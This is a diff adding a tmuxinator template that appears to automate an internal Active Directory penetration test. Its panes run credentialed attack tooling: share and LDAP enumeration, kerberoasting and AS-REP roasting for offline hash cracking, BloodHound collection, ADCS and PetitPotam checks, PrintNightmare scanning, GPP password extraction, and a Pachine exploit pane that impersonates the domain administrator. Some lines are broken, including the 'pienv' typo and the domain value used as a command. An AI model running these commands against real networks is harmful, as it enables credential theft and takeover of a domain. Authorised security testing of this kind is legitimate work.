@@ -1,0 +1,122 @@
+name: authd
+root: /RSM/
+
+#Notes
+#   - does it make more sense to allow specifying of DC? have default be /RSM/dcIP.txt
+#   - find a way to make an option to auto-run vs prefill
+
+# Variables/Defaults are set here
+<%
+  @settings["prefill"] ||= "python3 /RSM/newNomad/prefillTest.py"
+  @settings["domain"] ||= "domain.local"
+  @settings["user"] ||= "user"
+  @settings["pass"] ||= "pass"
+  @settings["nomadPass"] ||= "nomadPass"
+  @settings["workspace"] ||= "default"
+    #this must be unique to avoid potential conflict with prior testers
+  @settings["rootDir"] ||= "/RSM"
+  ### example of starting project with arguments: tmuxinator start internalTemplate domain=rsmus.local user=Sally pass="s8g9h3J##"
+%>
+
+# create and cd into client/testing folder before running
+windows:
+  - SMB: 
+      panes:
+        - cme:
+          - printf '\033]2;%s\033\\' 'SMB shares'
+          - mkdir -p <%= @settings["rootDir"] %>/scans/Lists/smb; cd <%= @settings["rootDir"] %>/scans/Lists/smb
+          - crackmapexec smb <%= @settings["rootDir"] %>/scans/Lists/smb.lst --shares -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' | tee RSM/scans/Lists/smb/cme-<%= @settings["user"] %>-shares.txt
+        - smbmap:
+          - printf '\033]2;%s\033\\' 'smbmap'
+          - <%= @settings["prefill"] %> "smbmap -H smbIP -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -R"; clear
+        - dumpsterdiver:
+          - printf '\033]2;%s\033\\' 'dumpsterdiver'
+          - cd /opt/nomad-tools && git clone https://github.com/securing/DumpsterDiver.git && cd DumpsterDiver && pipenv install
+          - pipenv run python3 DumpsterDiver.py --help
+  - LDAP: 
+      panes:
+        - ldapdomaindump:
+          - printf '\033]2;%s\033\\' 'ldapdomaindump'
+          - mkdir <%= @settings["rootDir"] %>/ldap/domaindump && cd <%= @settings["rootDir"] %>/ldap/domaindump
+          - ldapdomaindump -u '<%= @settings["domain"] %>\<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' `cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1`
+        - getADusers:
+          - printf '\033]2;%s\033\\' 'getADusers'
+          - GetADUsers.py -all '<%= @settings["domain"] %>/<%= @settings["user"] %>:<%= @settings["pass"] %>' -dc-ip `cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1` | tee <%= @settings["rootDir"] %>/ldap/getADUsers.txt
+        - ldap signing:
+          - printf '\033]2;%s\033\\' 'ldap signing'
+          - cd /opt/nomad-tools/LdapRelayScan/
+          - python3 LdapRelayScan.py -method BOTH -dc-ip $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>'
+        - get user descriptions:
+          - printf '\033]2;%s\033\\' 'get user descriptions'
+          - crackmapexec ldap `cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1` -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -M get-desc-users
+        - MAQ:
+          - printf '\033]2;%s\033\\' 'MAQ'
+          - crackmapexec ldap `cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1` -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -M MAQ
+        - ldap-checker:
+          - printf '\033]2;%s\033\\' 'ldap-checker'
+          - crackmapexec ldap `cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1` -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -M ldap-checker
+  - kerberoasting: 
+      panes:
+        - kerberoasting:
+          - printf '\033]2;%s\033\\' 'kerberoasting'
+          - mkdir <%= @settings["rootDir"] %>/kerberoast
+          - GetUserSPNs.py '<%= @settings["domain"] %>/<%= @settings["user"] %>:<%= @settings["pass"] %>' -dc-ip $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -request -outputfile <%= @settings["rootDir"] %>/kerberoast/kerberoasting.txt
+        - delegation:
+          - printf '\033]2;%s\033\\' 'delegation'
+          - findDelegation.py '<%= @settings["domain"] %>/<%= @settings["user"] %>:<%= @settings["pass"] %>'
+  - samTheAdmin: 
+      panes:
+        - check:
+          - printf '\033]2;%s\033\\' 'check'
+          - cd /opt/nomad-tools && git clone https://github.com/ly4k/Pachine.git; cd Pachine && pipenv install
+          - pipenv shell
+          - echo "test"
+          - python3 -m pip install ldap3 impacket
+          - python3 pachine.py -dc-host <%= @settings["domain"] %> -scan '<%= @settings["domain"] %>/<%= @settings["user"] %>:<%= @settings["pass"] %>'
+          #- pipenv run python3 pachine.py -dc-host dc.<%= @settings["domain"] %> -scan '<%= @settings["domain"] %>/<%= @settings["user"] %>:<%= @settings["pass"] %>'
+        - exploit:
+          - printf '\033]2;%s\033\\' 'exploit'
+          - cd /opt/nomad-tools/
+          - <%= @settings["domain"] %> "cd Pachine; pienv run python3 pachine.py -dc-host <%= @settings["domain"] %> -spn cifs/dc.<%= @settings["domain"] %> -impersonate administrator '<%= @settings["domain"] %>/<%= @settings["user"] %>:<%= @settings["pass"] %>'"; echo -e "\e[0;32mUpdate DC Netbios name\033[0m"
+  - bloodhound: 
+      panes:
+        - bloodhound:
+          - printf '\033]2;%s\033\\' 'bloodhound'
+          - cd /opt/nomad-tools/
+          - git clone https://github.com/fox-it/BloodHound.py.git
+          - cd BloodHound.py
+          - python3 /opt/nomad-tools/BloodHound.py/bloodhound.py -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -c all -d <%= @settings["domain"] %>
+  - ADCS: 
+      panes:
+        - cme ADCS:
+          - printf '\033]2;%s\033\\' 'cme ADCS'
+          - crackmapexec ldap `cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1` -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -M adcs
+        - certipy:
+          - printf '\033]2;%s\033\\' 'certipy'
+          - mkdir <%= @settings["rootDir"] %>/certipy
+          - certipy find -u '<%= @settings["user"] %>@<%= @settings["domain"] %>' -p '<%= @settings["pass"] %>' -dc-ip `cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1` -old-bloodhound -scheme ldap | tee <%= @settings["rootDir"] %>/certipy/certipy.txt
+  - PetitPotam: 
+      panes:
+        - PetitPotam:
+          - printf '\033]2;%s\033\\' 'PetitPotam'
+          - crackmapexec smb `cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1` -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -M petitpotam | tee petitpotam.txt
+  - misc: 
+      panes:
+        - printNightmare:
+          - printf '\033]2;%s\033\\' 'printNightmare'
+          - crackmapexec smb <%= @settings["rootDir"] %>/scans/Lists/smb.lst -M spooler
+          - echo <%= @settings['nomadPass'] %> | sudo -S su 
+          # install and enable docker
+          - sudo apt install -y docker.io && sudo systemctl enable docker --now && sudo usermod -aG docker $USER
+          - cd /opt/nomad-tools/; git clone https://github.com/eversinc34/ItWasAllADream.git && cd ItWasAllADream && docker build -t itwasalladream .
+          # grab hosts with open RPC ports (often more are found through additional nmap scans, but this can also be modified to use results from masscan)
+          - msfconsole -q -x 'workspace -a <%= @settings["workspace"]  %>; services -u -O 6 -p 111,135,593,2049 -o <%= @settings["rootDir"] %>/scans/Lists/rpcHosts.txt -c name; exit' && cat <%= @settings["rootDir"] %>/scans/Lists/rpcHosts.txt | sed '1d' | cut -d "," -f 1 | tr -d '"' > <%= @settings["rootDir"] %>/scans/Lists/rpcHosts-cleaned.txt
+          # create docker container to test printerNightmare
+          - for i in `cat <%= @settings["rootDir"] %>/scans/Lists/rpcHosts-cleaned.txt`; do echo testing:$i; sudo docker run -it itwasalladream -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> $i; echo ""; done
+        - GPP password:
+          - printf '\033]2;%s\033\\' 'GPP password'
+          - crackmapexec smb `cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1` -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -M gpp_password
+        - authd ASREProast:
+          - printf '\033]2;%s\033\\' 'authd ASREP roast'
+          - <%= @settings["prefill"] %> 'GetNPUsers.py <%= @settings["domain"] %>/ -dc-ip $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -no-pass -usersfile $USERFILENAME -outputfile <%= @settings["rootDir"] %>/scans/authd-asrepRoast.txt -format john'; clear
+
